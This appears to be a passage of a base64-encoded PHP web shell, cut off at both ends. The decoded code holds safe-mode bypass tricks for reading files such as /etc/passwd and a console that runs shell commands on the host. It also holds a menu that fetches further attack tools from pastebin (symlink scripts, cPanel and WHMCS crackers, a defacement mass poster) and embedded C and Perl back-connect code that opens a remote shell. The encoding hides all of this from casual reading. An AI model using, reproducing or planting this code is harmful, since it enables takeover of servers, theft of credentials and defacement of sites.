CAgICAgICAgICAkdGVtcCA9IEB0ZW1wbmFtKCR0ZXN0LCAnY3gnKTsKICAgICAgICAgICAgaWYgKEBjb3B5KCJjb21wcmVzcy56bGliOi8vIiAuICRfUE9TVFsncDInXSwgJHRlbXApKSB7CiAgICAgICAgICAgICAgICBlY2hvIEBmaWxlX2dldF9jb250ZW50cygkdGVtcCk7CiAgICAgICAgICAgICAgICB1bmxpbmsoJHRlbXApOwogICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5Li4uIENhblwndCBvcGVuIGZpbGUnOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICRmaWxlcyA9IGdsb2IoJF9QT1NUWydwMiddIC4gJyonKTsKICAgICAgICAgICAgaWYgKGlzX2FycmF5KCRmaWxlcykpCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGVuYW1lKQogICAgICAgICAgICAgICAgICAgIGVjaG8gJGZpbGVuYW1lIC4gIlxuIjsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAkY2ggPSBjdXJsX2luaXQoImZpbGU6Ly8iIC4gJF9QT1NUWydwMiddIC4gIlx4MDAiIC4gU0VMRl9QQVRIKTsKICAgICAgICAgICAgY3VybF9leGVjKCRjaCk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgNDoKICAgICAgICAgICAgaW5pX3Jlc3RvcmUoInNhZmVfbW9kZSIpOwogICAgICAgICAgICBpbmlfcmVzdG9yZSgib3Blbl9iYXNlZGlyIik7CiAgICAgICAgICAgIGluY2x1ZGUoJF9QT1NUWydwMiddKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSA1OgogICAgICAgICAgICBmb3IgKDsgJF9QT1NUWydwMiddIDw9ICRfUE9TVFsncDMnXTsgJF9QT1NUWydwMiddKyspIHsKICAgICAgICAgICAgICAgICR1aWQgPSBAcG9zaXhfZ2V0cHd1aWQoJF9QT1NUWydwMiddKTsKICAgICAgICAgICAgICAgIGlmICgkdWlkKQogICAgICAgICAgICAgICAgICAgIGVjaG8gam9pbignOicsICR1aWQpIC4gIlxuIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlIDY6CiAgICAgICAgICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCdpbWFwX29wZW4nKSkKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAkc3RyZWFtID0gaW1hcF9vcGVuKCRfUE9TVFsncDInXSwgIiIsICIiKTsKICAgICAgICAgICAgaWYgKCRzdHJlYW0gPT0gRkFMU0UpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZWNobyBpbWFwX2JvZHkoJHN0cmVhbSwgMSk7CiAgICAgICAgICAgIGltYXBfY2xvc2UoJHN0cmVhbSk7CiAgICAgICAgICAgIGJyZWFrOwogICAgfQogICAgJHRlbXAgPSBvYl9nZXRfY2xlYW4oKTsKICAgIHByaW50SGVhZGVyKCk7CiAgICBlY2hvICc8aDE+U2FmZSBtb2RlIGJ5cGFzczwvaDE+PGRpdiBjbGFzcz1jb250ZW50Pic7CiAgICBlY2hvICc8c3Bhbj5Db3B5IChyZWFkIGZpbGUpPC9zcGFuPjxmb3JtIG9uc3VibWl0PVwnZyhudWxsLG51bGwsIjEiLHRoaXMucGFyYW0udmFsdWUpO3JldHVybiBmYWxzZTtcJz48aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGFyYW0+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+PC9mb3JtPjxicj48c3Bhbj5HbG9iIChsaXN0IGRpcik8L3NwYW4+PGZvcm0gb25zdWJtaXQ9XCdnKG51bGwsbnVsbCwiMiIsdGhpcy5wYXJhbS52YWx1ZSk7cmV0dXJuIGZhbHNlO1wnPjxpbnB1dCB0eXBlPXRleHQgbmFtZT1wYXJhbT48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+PGJyPjxzcGFuPkN1cmwgKHJlYWQgZmlsZSk8L3NwYW4+PGZvcm0gb25zdWJtaXQ9XCdnKG51bGwsbnVsbCwiMyIsdGhpcy5wYXJhbS52YWx1ZSk7cmV0dXJuIGZhbHNlO1wnPjxpbnB1dCB0eXBlPXRleHQgbmFtZT1wYXJhbT48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+PGJyPjxzcGFuPkluaV9yZXN0b3JlIChyZWFkIGZpbGUpPC9zcGFuPjxmb3JtIG9uc3VibWl0PVwnZyhudWxsLG51bGwsIjQiLHRoaXMucGFyYW0udmFsdWUpO3JldHVybiBmYWxzZTtcJz48aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGFyYW0+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+PC9mb3JtPjxicj48c3Bhbj5Qb3NpeF9nZXRwd3VpZCAoIlJlYWQiIC9ldGMvcGFzc3dkKTwvc3Bhbj48dGFibGU+PGZvcm0gb25zdWJtaXQ9XCdnKG51bGwsbnVsbCwiNSIsdGhpcy5wYXJhbTEudmFsdWUsdGhpcy5wYXJhbTIudmFsdWUpO3JldHVybiBmYWxzZTtcJz48dHI+PHRkPkZyb208L3RkPjx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGFyYW0xIHZhbHVlPTA+PC90ZD48L3RyPjx0cj48dGQ+VG88L3RkPjx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGFyYW0yIHZhbHVlPTEwMDA+PC90ZD48L3RyPjwvdGFibGU+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+PC9mb3JtPjxicj48YnI+PHNwYW4+SW1hcF9vcGVuIChyZWFkIGZpbGUpPC9zcGFuPjxmb3JtIG9uc3VibWl0PVwnZyhudWxsLG51bGwsIjYiLHRoaXMucGFyYW0udmFsdWUpO3JldHVybiBmYWxzZTtcJz48aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGFyYW0+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+PC9mb3JtPic7CiAgICBpZiAoJHRlbXApCiAgICAgICAgZWNobyAnPHByZSBjbGFzcz0ibWwxIiBzdHlsZT0ibWFyZ2luLXRvcDo1cHgiIGlkPSJPdXRwdXQiPicgLiAkdGVtcCAuICc8L3ByZT4nOwogICAgZWNobyAnPC9kaXY+JzsKICAgIHByaW50Rm9vdGVyKCk7Cn0KCmZ1bmN0aW9uIGFjdGlvbkNvbnNvbGUoKQp7CiAgICBpZiAoaXNzZXQoJF9QT1NUWydhamF4J10pKSB7CiAgICAgICAgJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pIC4gJ2FqYXgnXSA9IHRydWU7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBlY2hvICJkb2N1bWVudC5jZi5jbWQudmFsdWU9Jyc7XG4iOwogICAgICAgICR0ZW1wID0gQGljb252KCRfUE9TVFsnY2hhcnNldCddLCAnVVRGLTgnLCBhZGRjc2xhc2hlcygiXG4kICIgLiAkX1BPU1RbJ3AxJ10gLiAiXG4iIC4gZXgoJF9QT1NUWydwMSddKSwgIlxuXHJcdFxcJ1wwIikpOwogICAgICAgIGlmIChwcmVnX21hdGNoKCIhLipjZFxzKyhbXjtdKykkISIsICRfUE9TVFsncDEnXSwgJG1hdGNoKSkgewogICAgICAgICAgICBpZiAoQGNoZGlyKCRtYXRjaFsxXSkpIHsKICAgICAgICAgICAgICAgICRHTE9CQUxTWydjd2QnXSA9IEBnZXRjd2QoKTsKICAgICAgICAgICAgICAgIGVjaG8gImRvY3VtZW50Lm1mLmMudmFsdWU9JyIgLiAkR0xPQkFMU1snY3dkJ10gLiAiJzsiOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVjaG8gImRvY3VtZW50LmNmLm91dHB1dC52YWx1ZSs9JyIgLiAkdGVtcCAuICInOyI7CiAgICAgICAgZWNobyAiZG9jdW1lbnQuY2Yub3V0cHV0LnNjcm9sbFRvcCA9IGRvY3VtZW50LmNmLm91dHB1dC5zY3JvbGxIZWlnaHQ7IjsKICAgICAgICAkdGVtcCA9IG9iX2dldF9jbGVhbigpOwogICAgICAgIGVjaG8gc3RybGVuKCR0ZW1wKSwgIlxuIiwgJHRlbXA7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIHByaW50SGVhZGVyKCk7CiAgICAKICAgIGVjaG8gJzxzY3JpcHQ+CmlmKHdpbmRvdy5FdmVudCkgd2luZG93LmNhcHR1cmVFdmVudHMoRXZlbnQuS0VZRE9XTik7CnZhciBjbWRzID0gbmV3IEFycmF5KCIiKTsKdmFyIGN1ciA9IDA7CmZ1bmN0aW9uIGtwKGUpIHsKICAgIHZhciBuID0gKHdpbmRvdy5FdmVudCkgPyBlLndoaWNoIDogZS5rZXlDb2RlOwogICAgaWYobiA9PSAzOCkgewogICAgICAgIGN1ci0tOwogICAgICAgIGlmKGN1cj49MCkKICAgICAgICAgICAgZG9jdW1lbnQuY2YuY21kLnZhbHVlID0gY21kc1tjdXJdOwogICAgICAgIGVsc2UKICAgICAgICAgICAgY3VyKys7CiAgICB9IGVsc2UgaWYobiA9PSA0MCkgewogICAgICAgIGN1cisrOwogICAgICAgIGlmKGN1ciA8IGNtZHMubGVuZ3RoKQogICAgICAgICAgICBkb2N1bWVudC5jZi5jbWQudmFsdWUgPSBjbWRzW2N1cl07CiAgICAgICAgZWxzZQogICAgICAgICAgICBjdXItLTsKICAgIH0KfQpmdW5jdGlvbiBhZGQoY21kKSB7CiAgICBjbWRzLnBvcCgpOwogICAgY21kcy5wdXNoKGNtZCk7CiAgICBjbWRzLnB1c2goIiIpOwogICAgY3VyID0gY21kcy5sZW5ndGgtMTsKfQo8L3NjcmlwdD4nOwogICAgZWNobyAnPGgxPkNvbnNvbGU8L2gxPjxkaXYgY2xhc3M9Y29udGVudD48Zm9ybSBuYW1lPWNmIG9uc3VibWl0PSJpZihkb2N1bWVudC5jZi5jbWQudmFsdWU9PVwnY2xlYXJcJyl7ZG9jdW1lbnQuY2Yub3V0cHV0LnZhbHVlPVwnXCc7ZG9jdW1lbnQuY2YuY21kLnZhbHVlPVwnXCc7cmV0dXJuIGZhbHNlO31hZGQodGhpcy5jbWQudmFsdWUpO2lmKHRoaXMuYWpheC5jaGVja2VkKXthKG51bGwsbnVsbCx0aGlzLmNtZC52YWx1ZSk7fWVsc2V7ZyhudWxsLG51bGwsdGhpcy5jbWQudmFsdWUpO30gcmV0dXJuIGZhbHNlOyI+PHNlbGVjdCBuYW1lPWFsaWFzPic7CiAgICBmb3JlYWNoICgkR0xPQkFMU1snYWxpYXNlcyddIGFzICRuID0+ICR2KSB7CiAgICAgICAgaWYgKCR2ID09ICcnKSB7CiAgICAgICAgICAgIGVjaG8gJzxvcHRncm91cCBsYWJlbD0iLScgLiBodG1sc3BlY2lhbGNoYXJzKCRuKSAuICctIj48L29wdGdyb3VwPic7CiAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgIH0KICAgICAgICBlY2hvICc8b3B0aW9uIHZhbHVlPSInIC4gaHRtbHNwZWNpYWxjaGFycygkdikgLiAnIj4nIC4gJG4gLiAnPC9vcHRpb24+JzsKICAgIH0KICAgIGlmIChlbXB0eSgkX1BPU1RbJ2FqYXgnXSkgJiYgIWVtcHR5KCRfUE9TVFsncDEnXSkpCiAgICAgICAgJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pIC4gJ2FqYXgnXSA9IGZhbHNlOwogICAgZWNobyAnPC9zZWxlY3Q+PGlucHV0IHR5cGU9YnV0dG9uIG9uY2xpY2s9ImFkZChkb2N1bWVudC5jZi5hbGlhcy52YWx1ZSk7aWYoZG9jdW1lbnQuY2YuYWpheC5jaGVja2VkKXthKG51bGwsbnVsbCxkb2N1bWVudC5jZi5hbGlhcy52YWx1ZSk7fWVsc2V7ZyhudWxsLG51bGwsZG9jdW1lbnQuY2YuYWxpYXMudmFsdWUpO30iIHZhbHVlPSI+PiI+IDxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9YWpheCB2YWx1ZT0xICcgLiAoJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pIC4gJ2FqYXgnXSA/ICdjaGVja2VkJyA6ICcnKSAuICc+IHNlbmQgdXNpbmcgQUpBWDxici8+PHRleHRhcmVhIGNsYXNzPWJpZ2FyZWEgbmFtZT1vdXRwdXQgc3R5bGU9ImJvcmRlci1ib3R0b206MDsiIHJlYWRvbmx5Pic7CiAgICBpZiAoIWVtcHR5KCRfUE9TVFsncDEnXSkpIHsKICAgICAgICBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoIiQgIiAuICRfUE9TVFsncDEnXSAuICJcbiIgLiBleCgkX1BPU1RbJ3AxJ10pKTsKICAgIH0KICAgIGVjaG8gJzwvdGV4dGFyZWE+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWNtZCBzdHlsZT0iYm9yZGVyLXRvcDoxO3dpZHRoOjEwMCU7IiBvbmtleWRvd249ImtwKGV2ZW50KTsiPic7CiAgICBlY2hvICc8L2Zvcm0+PC9kaXY+PHNjcmlwdD5kb2N1bWVudC5jZi5jbWQuZm9jdXMoKTs8L3NjcmlwdD4nOwogICAgcHJpbnRGb290ZXIoKTsKfQoKZnVuY3Rpb24gYWN0aW9uTG9nb3V0KCkKewogICAgdW5zZXQoJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSk7CiAgICBlY2hvICc8dGl0bGU+R2V0IG91dCBOb3c8L3RpdGxlPjxib2R5IGJnY29sb3I9IzAwMDAwMD48Y2VudGVyPjxicj4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj5ib2R5LCBhOmhvdmVyIHtjdXJzb3I6IHVybChodHRwOi8vY3VyLmN1cnNvcnMtNHUubmV0L2N1cnNvcnMvY3VyLTExL2N1cjEwNTQuY3VyKSwgcHJvZ3Jlc3MgIWltcG9ydGFudDt9PC9zdHlsZT48YSBocmVmPSJodHRwOi8vd3d3LmN1cnNvcnMtNHUuY29tL2N1cnNvci8yMDEyLzAyLzExL2Nocm9tZS1wb2ludGVyLmh0bWwiIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0iQ2hyb21lIFBvaW50ZXIiPjxpbWcgc3JjPSJodHRwOi8vY3VyLmN1cnNvcnMtNHUubmV0L2N1cnNvci5wbmciIGJvcmRlcj0iMCIgYWx0PSJDaHJvbWUgUG9pbnRlciIgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlOyB0b3A6IDBweDsgcmlnaHQ6IDBweDsiIC8+PC9hPgo8c3BhbiBzdHlsZT0iY29sb3I6cmVkO2ZvbnQ6IDIwcHQgYXVkaW93aWRlOyI+WW91ciBhcmUgb3V0IG5vdzwvaDI+PC9zcGFuPjwvY2VudGVyPjwvYm9keT4nOwp9CgpmdW5jdGlvbiBhY3Rpb25TZWxmUmVtb3ZlKCkKewogICAgcHJpbnRIZWFkZXIoKTsKICAgIGlmICgkX1BPU1RbJ3AxJ10gPT0gJ3llcycpIHsKICAgICAgICBpZiAoQHVubGluayhTRUxGX1BBVEgpKQogICAgICAgICAgICBkaWUoJ1NoZWxsIGhhcyBiZWVuIHJlbW92ZWQnKTsKICAgICAgICBlbHNlCiAgICAgICAgICAgIGVjaG8gJ3VubGluayBlcnJvciEnOwogICAgfQogICAgZWNobyAnPGgxPlN1aWNpZGU8L2gxPjxkaXYgY2xhc3M9Y29udGVudD5SZWFsbHkgd2FudCB0byByZW1vdmUgdGhlIHNoZWxsPzxicj48YSBocmVmPSMgb25jbGljaz0iZyhudWxsLG51bGwsXCd5ZXNcJykiPlllczwvYT48L2Rpdj4nOwogICAgcHJpbnRGb290ZXIoKTsKfQovLy9teSBlZGl0aW5nIHN0YXJ0IGhlcmUgZm9yIHRvb2xzCmZ1bmN0aW9uIGRvd25sb2FkX3JlbW90ZV9maWxlKCRmaWxlX3VybCwgJHNhdmVfdG8pCnsKICAgICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGVfdXJsKTsKICAgIAogICAgZmlsZV9wdXRfY29udGVudHMoJHNhdmVfdG8sICRjb250ZW50KTsKICAgIAp9CmlmIChpc3NldCgkX1BPU1RbJ2RoYW51c2gnXSkpIHsKICAgIGRvd25sb2FkX3JlbW90ZV9maWxlKCdodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1VOW5xRWdSTicsIHJlYWxwYXRoKCIuLyIpIC4gJy9kaGFudXNoLnBocCcpOwogICAgaGVhZGVyKCJsb2NhdGlvbjpkaGFudXNoLnBocCIpOwogICAgCn0KaWYgKGlzc2V0KCRfUE9TVFsnU3ltbGlua2J5U21ldmsnXSkpIHsKICAgIGRvd25sb2FkX3JlbW90ZV9maWxlKCdodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1QaFNrN0t2cScsIHJlYWxwYXRoKCIuLyIpIC4gJy9TeW1saW5rYnlTbWV2ay5waHAnKTsKICAgIGhlYWRlcigibG9jYXRpb246U3ltbGlua2J5U21ldmsucGhwIik7CiAgICAKfQppZiAoaXNzZXQoJF9QT1NUWydTeW1saW5rYnlDaGVldGFoJ10pKSB7CiAgICBkb3dubG9hZF9yZW1vdGVfZmlsZSgnaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9RVhlamdBTXYnLCByZWFscGF0aCgiLi8iKSAuICcvU3ltbGlua2J5Q2hlZXRhaC5waHAnKTsKICAgIGhlYWRlcigibG9jYXRpb246U3ltbGlua2J5Q2hlZXRhaC5waHAiKTsKICAgIAp9CmlmIChpc3NldCgkX1BPU1RbJ1N5bWxpbmtieVRvcmphbiddKSkgewogICAgZG93bmxvYWRfcmVtb3RlX2ZpbGUoJ2h0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3LnBocD9pPVlVZzRwWGUyJywgcmVhbHBhdGgoIi4vIikgLiAnL3N5bS5weScpOwogICAgZWNobyAiPHNjcmlwdD5hbGVydCgnU2NyaXB0IGlzIGhlcmUgL3N5bS5weSBleGVjdXRlIGl0IGZyb20gdGhlcmUuVHlwZSBpbiBjb25zb2xlIChQeXRob24gc3ltLnB5KScpPC9zY3JpcHQ+IjsKICAgIAogICAgCn0KaWYgKGlzc2V0KCRfUE9TVFsnQ3BhbmVsQ3JhY2tlciddKSkgewogICAgZG93bmxvYWRfcmVtb3RlX2ZpbGUoJ2h0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3LnBocD9pPXpZeHNQME1IJywgcmVhbHBhdGgoIi4vIikgLiAnL0NwYW5lbENyYWNrZXIucGhwJyk7CiAgICBoZWFkZXIoImxvY2F0aW9uOkNwYW5lbENyYWNrZXIucGhwIik7CiAgICAKfQppZiAoaXNzZXQoJF9QT1NUWydEYmxvZ2luJ10pKSB7CiAgICBkb3dubG9hZF9yZW1vdGVfZmlsZSgnaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9UTUyRzlrakonLCByZWFscGF0aCgiLi8iKSAuICcvRGJsb2dpbi5waHAnKTsKICAgIGhlYWRlcigibG9jYXRpb246RGJsb2dpbi5waHAiKTsKICAgIAp9CmlmIChpc3NldCgkX1BPU1RbJ0NwYW5lbGtieUd1amphciddKSkgewogICAgZG93bmxvYWRfcmVtb3RlX2ZpbGUoJ2h0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3LnBocD9pPU5NOVNEOWJWJywgcmVhbHBhdGgoIi4vIikgLiAnL0NwYW5lbGtieUd1amphci5waHAnKTsKICAgIGhlYWRlcigibG9jYXRpb246Q3BhbmVsa2J5R3VqamFyLnBocCIpOwogICAgCn0KaWYgKGlzc2V0KCRfUE9TVFsnYjM3NGsnXSkpIHsKICAgIGRvd25sb2FkX3JlbW90ZV9maWxlKCdodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT0xaURaZmpaOScsIHJlYWxwYXRoKCIuLyIpIC4gJy9iMzc0ay5waHAnKTsKICAgIGhlYWRlcigibG9jYXRpb246YjM3NGsucGhwIik7CiAgICAKfQppZiAoaXNzZXQoJF9QT1NUWydab25laE1hc3NQb3N0ZXInXSkpIHsKICAgIGRvd25sb2FkX3JlbW90ZV9maWxlKCdodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1tRFhuU25qMicsIHJlYWxwYXRoKCIuLyIpIC4gJy9ab25laE1hc3NQb3N0ZXIucGhwJyk7CiAgICBoZWFkZXIoImxvY2F0aW9uOlpvbmVoTWFzc1Bvc3Rlci5waHAiKTsKICAgIAp9CmlmIChpc3NldCgkX1BPU1RbJ1dobWNzJ10pKSB7CiAgICBkb3dubG9hZF9yZW1vdGVfZmlsZSgnaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9SzBLUVdVQ2snLCByZWFscGF0aCgiLi8iKSAuICcvV2htY3MucGhwJyk7CiAgICBoZWFkZXIoImxvY2F0aW9uOldobWNzLnBocCIpOwogICAgCn0KCgoKCgoKZnVuY3Rpb24gYWN0aW9uSW1wb3J0U2NyaXB0cygpCnsKICAgIHByaW50SGVhZGVyKCk7CiAgICBlY2hvICc8dGFibGUgYm9yZGVyPSIxcHgiIGFsaWduPSJjZW50ZXIiIGlkID0iU21ldmt0b29scyIgY2VsbHBhZGRpbmc9IjEwIiBib3JkZXItY29sb3IiZ3JlZW4iPjx0cj48dGQ+SnVzdCBjbGljayBhbmQgZ2V0IHRoZSBTY3JpcHQgOikuPC90ZD48dHI+PHRkPgo8Zm9ybSBhY3Rpb24gPSIiIG1ldGhvZD0icG9zdCI+CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZSA9ICJzdWJtaXQiIG5hbWU9ImRoYW51c2giICAgICAgICAgICAgICB2YWx1ZSA9IkRoYW51c2ggU2hlbGwiPjwvdGQ+PC90cj4nOwogICAgZWNobyAnPHRkPjxmb3JtIGFjdGlvbiA9IiIgICAgIG1ldGhvZD0icG9zdCI+PGlucHV0IHR5cGUgPSAic3VibWl0IiBuYW1lPSJTeW1saW5rYnlTbWV2ayIgICAgICAgdmFsdWUgPSJTeW1saW5rIFNjcmlwdCBCeSBTbUV2S19QYVRoQW4iPjwvYT48L3RkPjwvdHI+JzsKICAgIGVjaG8gJzx0cj48dGQ+PGZvcm0gYWN0aW9uID0iIiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlID0gInN1Ym1pdCIgbmFtZT0iU3ltbGlua2J5Q2hlZXRhaCIgICAgIHZhbHVlID0iU3ltbGluayBCeSBLYXNobWlyaSBDaGVldGFoIj48L2E+PC90ZD48L3RyPic7CiAgICBlY2hvICc8dHI+PHRkPjxmb3JtIGFjdGlvbiA9IiIgbWV0aG9kPSJwb3N0Ij48aW5wdXQgdHlwZSA9ICJzdWJtaXQiIG5hbWU9IlN5bWxpbmtieVRvcmphbiIgICAgICB2YWx1ZSA9IlN5bWxpbmsgUHl0aG9uIFNjcmlwdCBCeSBUb3JqYW4iPjwvYT48L3RkPjwvdHI+JzsKICAgIGVjaG8gJzx0cj48dGQ+PGZvcm0gYWN0aW9uID0iIiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlID0gInN1Ym1pdCIgbmFtZT0iQ3BhbmVsQ3JhY2tlciIgICAgICAgIHZhbHVlID0iQ3BhbmVsIENyYWNrZXIiPjwvYT48L3RkPjwvdHI+JzsKICAgIGVjaG8gJzx0cj48dGQ+PGZvcm0gYWN0aW9uID0iIiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlID0gInN1Ym1pdCIgbmFtZT0iRGJsb2dpbiIgICAgICAgICAgICAgIHZhbHVlID0iRGF0YWJhc2UgTG9naW4gU2NyaXB0Ij48L2E+PC90ZD48L3RyPic7CiAgICBlY2hvICc8dHI+PHRkPjxmb3JtIGFjdGlvbiA9IiIgbWV0aG9kPSJwb3N0Ij48aW5wdXQgdHlwZSA9ICJzdWJtaXQiIG5hbWU9IkNwYW5lbGtieUd1amphciIgICAgICB2YWx1ZSA9Ikd1amphciBQY3AgQ3BhbmVsIENyYWNrZXIiPjwvYT48L3RkPjwvdHI+JzsKICAgIGVjaG8gJzx0cj48dGQ+PGZvcm0gYWN0aW9uID0iIiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlID0gInN1Ym1pdCIgbmFtZT0iYjM3NGsiICAgICAgICAgICAgICAgICB2YWx1ZSA9ImIzNzRrIFNoZWxsIj48L2E+PC90ZD48L3RyPic7CiAgICBlY2hvICc8dHI+PHRkPjxmb3JtIGFjdGlvbiA9IiIgbWV0aG9kPSJwb3N0Ij48aW5wdXQgdHlwZSA9ICJzdWJtaXQiIG5hbWU9IlpvbmVoTWFzc1Bvc3RlciIgICAgICAgdmFsdWUgPSJab25lLWggTWFzcyBQb3N0ZXIiPjwvYT48L3RkPjwvdHI+JzsKICAgIGVjaG8gJzx0cj48dGQ+PGZvcm0gYWN0aW9uID0iIiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlID0gInN1Ym1pdCIgbmFtZT0iV2htY3MiICAgICAgICAgICAgICAgICB2YWx1ZSA9IldITUNTIEtJTExFUiBWMyI+PC9hPjwvdGQ+PC90cj4nOwogICAgCiAgICAKICAgIAogICAgCiAgICAKICAgIAogICAgcHJpbnRGb290ZXIoKTsKfQoKCmZ1bmN0aW9uIGFjdGlvbk5ldHdvcmsoKQp7CiAgICBwcmludEhlYWRlcigpOwogICAgJGJhY2tfY29ubmVjdF9jID0gIkkybHVZMngxWkdVZ1BITjBaR2x2TG1nK0RRb2phVzVqYkhWa1pTQThjM2x6TDNOdlkydGxkQzVvUGcwS0kybHVZMngxWkdVZ1BHNWxkR2x1WlhRdmFXNHVhRDROQ21sdWRDQnRZV2x1S0dsdWRDQmhjbWRqTENCamFHRnlJQ3BoY21kMlcxMHBJSHNOQ2lBZ0lDQnBiblFnWm1RN0RRb2dJQ0FnYzNSeWRXTjBJSE52WTJ0aFpHUnlYMmx1SUhOcGJqc05DaUFnSUNCa1lXVnRiMjRvTVN3d0tUc05DaUFnSUNCemFXNHVjMmx1WDJaaGJXbHNlU0E5SUVGR1gwbE9SVlE3RFFvZ0lDQWdjMmx1TG5OcGJsOXdiM0owSUQwZ2FIUnZibk1vWVhSdmFTaGhjbWQyV3pKZEtTazdEUW9nSUNBZ2MybHVMbk5wYmw5aFpHUnlMbk5mWVdSa2NpQTlJR2x1WlhSZllXUmtjaWhoY21kMld6RmRLVHNOQ2lBZ0lDQm1aQ0E5SUhOdlkydGxkQ2hCUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1NWQlFVazlVVDE5VVExQXBJRHNOQ2lBZ0lDQnBaaUFvS0dOdmJtNWxZM1FvWm1Rc0lDaHpkSEoxWTNRZ2MyOWphMkZrWkhJZ0tpa2dKbk5wYml3Z2MybDZaVzltS0hOMGNuVmpkQ0J6YjJOcllXUmtjaWtwS1R3d0tTQjdEUW9nSUNBZ0lDQWdJSEJsY25KdmNpZ2lRMjl1Ym1WamRDQm1ZV2xzSWlrN0RRb2dJQ0FnSUNBZ0lISmxkSFZ5YmlBd093MEtJQ0FnSUgwTkNpQWdJQ0JrZFhBeUtHWmtMQ0F3S1RzTkNpQWdJQ0JrZFhBeUtHWmtMQ0F4S1RzTkNpQWdJQ0JrZFhBeUtHWmtMQ0F5S1RzTkNpQWdJQ0J6ZVhOMFpXMG9JaTlpYVc0dmMyZ2dMV2tpS1RzTkNpQWdJQ0JqYkc5elpTaG1aQ2s3RFFwOSI7CiAgICAkYmFja19jb25uZWN0X3AgPSAiSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1UyOWphMlYwT3cwS0pHbGhaR1J5UFdsdVpYUmZZWFJ2Ymlna1FWSkhWbHN3WFNrZ2ZId2daR2xsS0NKRmNuSnZjam9nSkNGY2JpSXBPdzBLSkhCaFpHUnlQWE52WTJ0aFpHUnlYMmx1S0NSQlVrZFdXekZkTENBa2FXRmtaSElwSUh4OElHUnBaU2dpUlhKeWIzSTZJQ1FoWEc0aUtUc05DaVJ3Y205MGJ6MW5aWFJ3Y205MGIySjVibUZ0WlNnbmRHTndKeWs3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z0pIQnliM1J2S1NCOGZDQmthV1VvSWtWeWNtOXlPaUFrSVZ4dUlpazdEUXBqYjI1dVpXTjBLRk5QUTB0RlZDd2dKSEJoWkdSeUtTQjhmQ0JrYVdVb0lrVnljbTl5T2lBa0lWeHVJaWs3RFFwdmNHVnVLRk5VUkVsT0xDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFVDFWVUxDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFUlZKU0xDQWlQaVpUVDBOTFJWUWlLVHNOQ25ONWMzUmxiU2duTDJKcGJpOXphQ0F0YVNjcE93MEtZMnh2YzJVb1UxUkVTVTRwT3cwS1kyeHZjMlVvVTFSRVQxVlVLVHNOQ21Oc2IzTmxLRk5VUkVWU1VpazciOwogICAgJGJpbmRfcG9ydF9jICAgID0gIkkybHVZMngxWkdVZ1BITjBaR2x2TG1nK0RRb2phVzVqYkhWa1pTQThjM1J5YVc1bkxtZytEUW9qYVc1amJIVmtaU0E4ZFc1cGMzUmtMbWcrRFFvamFX